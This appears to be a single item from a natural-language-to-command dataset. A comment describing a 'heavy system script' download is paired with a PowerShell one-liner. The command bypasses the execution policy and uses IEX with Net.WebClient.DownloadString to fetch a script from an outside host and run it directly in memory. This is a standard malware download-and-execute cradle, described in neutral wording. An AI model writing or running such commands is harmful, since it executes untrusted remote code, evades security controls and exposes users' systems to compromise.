# Natural language intent:
# Execute PowerShell with specific settings to download and execute a heavy system script from a specified URL.

powershell.exe -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://heavy-server.com/heavySys.ps1')
